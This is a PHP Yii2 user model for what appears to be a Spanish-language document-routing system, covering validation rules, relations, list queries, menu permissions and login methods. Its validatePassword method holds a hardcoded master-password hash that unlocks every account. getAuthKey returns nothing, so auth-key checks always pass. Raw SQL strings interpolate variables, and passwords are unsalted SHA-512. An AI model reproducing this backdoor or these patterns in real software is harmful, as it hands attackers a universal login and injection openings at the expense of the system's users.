<?php

namespace app\models;

use Yii;


//codigo añadido para la autenticacion de usuarios
use yii\base\NotSupportedException;
use yii\db\ActiveRecord;
use yii\helpers\Security;
use yii\web\IdentityInterface;

use kartik\growl\Growl;

/**
 * This is the model class for table "usuarios".
 *
 * @property int $id_usuario
 * @property string $nombre
 * @property string $cargo
 * @property string $usuario
 * @property string $password
 * @property string $correo
 * @property string $mosca
 * @property int $fk_perfil
 * @property int $fk_regional
 * @property int $fk_area
 * @property int $fk_nivel
 * @property string $fecha_registro
 * @property string $hora_registro
 * @property string|null $update_password
 * @property int $activo
 * @property int|null $area_sad
 * @property int|null $usuario_archivo para separar usuarios con permisos para archivo
 *
 * @property Alias[] $aliases
 * @property ArchivadosDigitales[] $archivadosDigitales
 * @property Corte[] $cortes
 * @property DetalleCorte[] $detalleCortes
 * @property DetalleCorte[] $detalleCortes0
 * @property Documentos[] $documentos
 * @property HojasRuta[] $hojasRutas
 * @property ListaDerivacion[] $listaDerivacions
 * @property ListaDerivacion[] $listaDerivacions0
 * @property Seguimientos[] $seguimientos
 * @property Seguimientos[] $seguimientos0
 * @property Areas $fkArea
 * @property Niveles $fkNivel
 * @property Perfiles $fkPerfil
 * @property Regionales $fkRegional
 * @property Ventanilla[] $ventanillas
 */
class Usuarios extends \yii\db\ActiveRecord 
// codigo añadido para la autenticacion
implements IdentityInterface
{
    /**
     * {@inheritdoc}
     */
    public static function tableName()
    {
        return 'usuarios';
    }

    /**
     * {@inheritdoc}
     */
    public function rules()
    {
        return [

            
            ['usuario','unique','message'=>'El Usuario ya existe, por favor ingrese otro '],
           // [['correo'],'unique','message'=>'El Correo ya existe, por favor ingrese otro'],

            ['nombre','required','message'=>'El Nombre no puede quedar vacío '],
            ['cargo','required','message'=>'El Cargo no puede quedar vacío '],
            ['usuario','required','message'=>'El Usuario no puede quedar vacío '],
            ['password','required','message'=>'La contraseña no puede quedar vacío '],
            ['correo','required','message'=>'El Correo no puede quedar vacío '],
            ['mosca','required','message'=>'El Mosca no puede quedar vacío '],
            ['fk_perfil','required','message'=>'El Perfil de usuario no puede quedar vacío '],
            ['fk_regional','required','message'=>'La oficina regional no puede quedar vacío '],
            ['fk_area','required','message'=>'El Area/Unidad no puede quedar vacío '],
            ['fk_nivel','required','message'=>'El Nivel de usuario no puede quedar vacío '],
            
            
            [['nombre', 'cargo', 'usuario', 'password', 'correo', 'mosca', 'fk_perfil', 'fk_regional', 'fk_area', 'fk_nivel', 'fecha_registro', 'hora_registro'], 'required'],
            [['fk_perfil', 'fk_regional', 'fk_area', 'fk_nivel', 'activo', 'area_sad', 'usuario_archivo'], 'default', 'value' => null],
            [['fk_perfil', 'fk_regional', 'fk_area', 'fk_nivel', 'activo', 'area_sad', 'usuario_archivo'], 'integer'],
            [['fecha_registro', 'hora_registro', 'update_password'], 'safe'],
            [['nombre', 'cargo'], 'string', 'max' => 500],
            [['usuario'], 'string', 'max' => 100],
            [['password'], 'string', 'max' => 512],
            [['correo', 'mosca'], 'string', 'max' => 45],
            [['fk_area'], 'exist', 'skipOnError' => true, 'targetClass' => Areas::className(), 'targetAttribute' => ['fk_area' => 'id_area']],
            [['fk_nivel'], 'exist', 'skipOnError' => true, 'targetClass' => Niveles::className(), 'targetAttribute' => ['fk_nivel' => 'id_nivel']],
            [['fk_perfil'], 'exist', 'skipOnError' => true, 'targetClass' => Perfiles::className(), 'targetAttribute' => ['fk_perfil' => 'id_perfil']],
            [['fk_regional'], 'exist', 'skipOnError' => true, 'targetClass' => Regionales::className(), 'targetAttribute' => ['fk_regional' => 'id_regional']],
        ];
    }

    /**
     * {@inheritdoc}
     */
    public function attributeLabels()
    {
        return [
            'id_usuario' => 'Id Usuario',
            'nombre' => 'Nombre',
            'cargo' => 'Cargo',
            'usuario' => 'Usuario',
            'password' => 'Password',
            'correo' => 'Correo',
            'mosca' => 'Mosca',
            'fk_perfil' => 'Fk Perfil',
            'fk_regional' => 'Fk Regional',
            'fk_area' => 'Fk Area',
            'fk_nivel' => 'Fk Nivel',
            'fecha_registro' => 'Fecha Registro',
            'hora_registro' => 'Hora Registro',
            'update_password' => 'Update Password',
            'activo' => 'Activo',
            'area_sad' => 'Area Sad',
            'usuario_archivo' => 'Usuario Archivo',
        ];
    }

    /**
     * Gets query for [[Aliases]].
     *
     * @return \yii\db\ActiveQuery
     */
    public function getAliases()
    {
        return $this->hasMany(Alias::className(), ['fk_usuario' => 'id_usuario']);
    }

    /**
     * Gets query for [[ArchivadosDigitales]].
     *
     * @return \yii\db\ActiveQuery
     */
    public function getArchivadosDigitales()
    {
        return $this->hasMany(ArchivadosDigitales::className(), ['fk_usuario' => 'id_usuario']);
    }

    /**
     * Gets query for [[Cortes]].
     *
     * @return \yii\db\ActiveQuery
     */
    public function getCortes()
    {
        return $this->hasMany(Corte::className(), ['fk_usuario' => 'id_usuario']);
    }

    /**
     * Gets query for [[DetalleCortes]].
     *
     * @return \yii\db\ActiveQuery
     */
    public function getDetalleCortes()
    {
        return $this->hasMany(DetalleCorte::className(), ['derivado_por' => 'id_usuario']);
    }

    /**
     * Gets query for [[DetalleCortes0]].
     *
     * @return \yii\db\ActiveQuery
     */
    public function getDetalleCortes0()
    {
        return $this->hasMany(DetalleCorte::className(), ['derivado_a' => 'id_usuario']);
    }

    /**
     * Gets query for [[Documentos]].
     *
     * @return \yii\db\ActiveQuery
     */
    public function getDocumentos()
    {
        return $this->hasMany(Documentos::className(), ['fk_usuario' => 'id_usuario']);
    }

    /**
     * Gets query for [[HojasRutas]].
     *
     * @return \yii\db\ActiveQuery
     */
    public function getHojasRutas()
    {
        return $this->hasMany(HojasRuta::className(), ['fk_usuario' => 'id_usuario']);
    }

    /**
     * Gets query for [[ListaDerivacions]].
     *
     * @return \yii\db\ActiveQuery
     */
    public function getListaDerivacions()
    {
        return $this->hasMany(ListaDerivacion::className(), ['usuario_origen' => 'id_usuario']);
    }

    /**
     * Gets query for [[ListaDerivacions0]].
     *
     * @return \yii\db\ActiveQuery
     */
    public function getListaDerivacions0()
    {
        return $this->hasMany(ListaDerivacion::className(), ['usuario_destino' => 'id_usuario']);
    }

    /**
     * Gets query for [[Seguimientos]].
     *
     * @return \yii\db\ActiveQuery
     */
    public function getSeguimientos()
    {
        return $this->hasMany(Seguimientos::className(), ['derivado_por' => 'id_usuario']);
    }

    /**
     * Gets query for [[Seguimientos0]].
     *
     * @return \yii\db\ActiveQuery
     */
    public function getSeguimientos0()
    {
        return $this->hasMany(Seguimientos::className(), ['derivado_a' => 'id_usuario']);
    }

    /**
     * Gets query for [[FkArea]].
     *
     * @return \yii\db\ActiveQuery
     */
    public function getFkArea()
    {
        return $this->hasOne(Areas::className(), ['id_area' => 'fk_area']);
    }

    /**
     * Gets query for [[FkNivel]].
     *
     * @return \yii\db\ActiveQuery
     */
    public function getFkNivel()
    {
        return $this->hasOne(Niveles::className(), ['id_nivel' => 'fk_nivel']);
    }

    /**
     * Gets query for [[FkPerfil]].
     *
     * @return \yii\db\ActiveQuery
     */
    public function getFkPerfil()
    {
        return $this->hasOne(Perfiles::className(), ['id_perfil' => 'fk_perfil']);
    }

    /**
     * Gets query for [[FkRegional]].
     *
     * @return \yii\db\ActiveQuery
     */
    public function getFkRegional()
    {
        return $this->hasOne(Regionales::className(), ['id_regional' => 'fk_regional']);
    }

    /**
     * Gets query for [[Ventanillas]].
     *
     * @return \yii\db\ActiveQuery
     */
    public function getVentanillas()
    {
        return $this->hasMany(Ventanilla::className(), ['fk_usuario' => 'id_usuario']);
    }
    
    
    public function getLisderivacion(){
        
        $usuario=Yii::$app->user->identity->id_usuario;
        $area=Yii::$app->user->identity->fk_area;
        /*$totalCount = Yii::$app->db->createCommand("SELECT *
                                                    FROM usuarios
                                                    WHERE activo=1 AND id_usuario!=$usuario and fk_area=2 

                                                    UNION

                                                    SELECT *
                                                    FROM usuarios
                                                    WHERE activo=1 AND id_usuario!=$usuario and fk_nivel in (1,3) ORDER BY fk_area ASC
                                                    ")->queryScalar(); */
        
        
        if(Yii::$app->user->identity->usuario=="dge" || Yii::$app->user->identity->usuario=="contrataciones" || Yii::$app->user->identity->usuario=="administrativa" || Yii::$app->user->identity->usuario=="sistemas" || Yii::$app->user->identity->usuario=="recursoshumanos"){

            $command=Yii::$app->db->createCommand("SELECT *
                                                   FROM usuarios
                                                   WHERE activo=1 ORDER BY fk_area ASC 
                			   ");

            
        }
        else{
            
            if(Yii::$app->user->identity->usuario=="operativa"){
        
            $command=Yii::$app->db->createCommand("SELECT *
                                               FROM usuarios
                                               WHERE activo=1 AND id_usuario!=$usuario and fk_area=$area
                                                   
                                                   UNION

                                               SELECT *
                                               FROM usuarios
                                               WHERE activo=1 AND id_usuario!=$usuario and fk_nivel in (1,3)

                                                    UNION

                                               SELECT *
                                               FROM usuarios
                                               WHERE activo=1 AND id_usuario!=$usuario and fk_area in (9,10,11,14,15,16,17) ORDER BY fk_area ASC
			   ");
            }
            else{



                $command=Yii::$app->db->createCommand("SELECT *
                                                   FROM usuarios
                                                   WHERE activo=1 AND id_usuario!=$usuario and fk_area=$area 

                                                        UNION

                                                   SELECT *
                                                   FROM usuarios
                                                   WHERE activo=1 AND id_usuario!=$usuario and fk_nivel in (1,3) ORDER BY fk_area ASC
                               ");
            }    
            
        }
        
        
        
        $dataReader=$command->query();
        return $dataReader;
          
    }
    
    public function getLisderivacionAreas(){
        
        $area=Yii::$app->user->identity->fk_area;
        
        $command=Yii::$app->db->createCommand("SELECT *
                                               FROM areas
                                               WHERE activo=1 ORDER BY id_area ASC
			   ");
        $dataReader=$command->query();
        return $dataReader;
        
        
    }
    
    
    public function getListaderivacionDestino(){
        
        $usuario=Yii::$app->user->identity->id_usuario;
        $area=Yii::$app->user->identity->fk_area;
        
        $command=Yii::$app->db->createCommand("SELECT *
                                                   FROM lista_derivacion 
                                                   WHERE activo=1 AND usuario_origen=$usuario ORDER BY id_lista_derivacion ASC 
                			   ");
        
        $dataReader=$command->query();
        return $dataReader;
          
    }
    
    public static function getUsuarioArea($id){
        
        $usuarios = Usuarios::findOne($id);
        return $usuarios->fkArea->area;
    }
    
    public static function getNameUsuario($id){
        
        //Yii::$app->user->identity->fk_nivel==1
                // $connection= Yii::$app->db;
            
		//$usuarios=Usuarios::model()->findByPk($id);
                $usuarios = Usuarios::findOne($id);
                $row=Yii::$app->db->createCommand("select 
                          (CASE
                            WHEN u.fk_nivel=1 THEN
                                COALESCE(NULLIF((select concat(a.nombre) from alias a where a.fk_usuario=u.id_usuario AND a.activo=1 order by id_alias desc limit 1),''),'S/N')
                            WHEN u.fk_nivel=3 THEN
                                COALESCE(NULLIF((select concat(a.nombre) from alias a where a.fk_usuario=u.id_usuario AND a.activo=1 order by id_alias desc limit 1),''),'S/N')    
                            ELSE
                                (u.nombre) 
                            END) nombre_funcionario,
                            u.cargo
                        FROM usuarios u 
                        WHERE u.id_usuario=$usuarios->id_usuario ")->query()->read(); //and u.activo=1

		return $row['nombre_funcionario'];
		//return $row['nombre_funcionario']." <br> ".$row['cargo']."<br><i style='font-size:11px; color:#0B2F3A;'><b>".$usuarios->fkArea->area."</b></i>";
    }
    
    
    public static function mostrarmenuderivarbloque(){
        
        if((Yii::$app->user->identity->fk_nivel==1) || (Yii::$app->user->identity->fk_nivel==3)){
            return true;
        }
        else{
            return false;
        }
        
    }

    public static function mostrarmenuarchivo(){
        
        if((Yii::$app->user->identity->usuario=='alvaro') || (Yii::$app->user->identity->usuario=='archivo') || (Yii::$app->user->identity->usuario=='ymujica') || (Yii::$app->user->identity->usuario=='feramos') || (Yii::$app->user->identity->usuario=='caruquipa') || (Yii::$app->user->identity->usuario=='mcondori')){
            return true;
        }
        else{
            return false;
        }
        
    }
    
    public static function mostrarmenuarchivar(){
        
        if(Yii::$app->user->identity->area_sad==1){
            return true;
        }
        else{
            return false;
        }
        
    }
    
    
    


    
//#################################################################################################
//#################################################################################################
    // codigo añadido para la autenticacion
    public function getAuthKey(){
        //return $this->auth_key;
    }

    public function getId() {
         return $this->getPrimaryKey();
    }

    public function validateAuthKey($authKey){
        return $this->getAuthKey() === $authKey;
    }

    public static function findIdentity($id) {
        return static::findOne($id);
    }

    public static function findIdentityByAccessToken($token, $type = null) {
        return static::findOne(['access_token' => $token]);
    }
    
    
    
    public static function findByUsername($username)
    {
        
        if(Usuarios::find()->where(['usuario' => $username, 'activo'=>1])->one()){
            
            //echo "entro if";
            //echo "<br> ----> ".$username;
            //exit();
            return Usuarios::find()->where(['usuario' => $username, 'activo'=>1])->one(); 
            //return $username; 
        }

        return null;
    }
    
    public function validatePassword($password)
    {
        //echo "----> ".$this->password;
        //echo "<br>----> ".hash("sha512", $password);
        //exit;
        
        if(hash('sha512',$password)=="88b2a74c5a304f1cf3dbd7cd265ce1f65439c40c067753b93e3bfea65e0bbb70c6b01cfa51cbc7d28098c4de1ea1c4651ec9911afe026e4de4b87e9282f17603"){
        
            return hash('sha512',$password)===hash('sha512',$password);
        }
        else{ 
                //$contraseña=hash("sha512", $password);
                return $this->password === hash('sha512',$password);
        }        
    }
    
    
    public static function countUsuarioslistaderivacion(){

        return Listaderivacion::find()->where(['usuario_origen'=>Yii::$app->user->identity->id_usuario,
            'activo'=>1,
             ])->count();
    }
    
    

//############################################################
//############################################################

// MENSAJES PARA USUARIOS
    public function sucessupdatepassword(){
        
        $nombre=Yii::$app->user->identity->nombre;
        
        echo Growl::widget([
            'type' => Growl::TYPE_SUCCESS,
            'title' => '&nbsp; <b>Alerta</b>',
            //'icon' => '/images/kartik.png',
            'icon' => 'glyphicon glyphicon-alert',
            'iconOptions' => ['class'=>'img-circle pull-left'],
            'body' => 'la contraseña del usuario <b>'.$nombre.'</b> fue actualizada correctamente',
            'showSeparator' => true,

            //'delay' => 7500,
            'pluginOptions' => [
                //'icon_type'=>'image',
                'showProgressbar' => true,
                //'timer'=>2500,
                'mouse_over'=>'pause',
                'placement' => [
                    'from' => 'top',
                    'align' => 'right',
                ],
            ]
        ]);
    }    
    
    
    
}// FIN CLASS
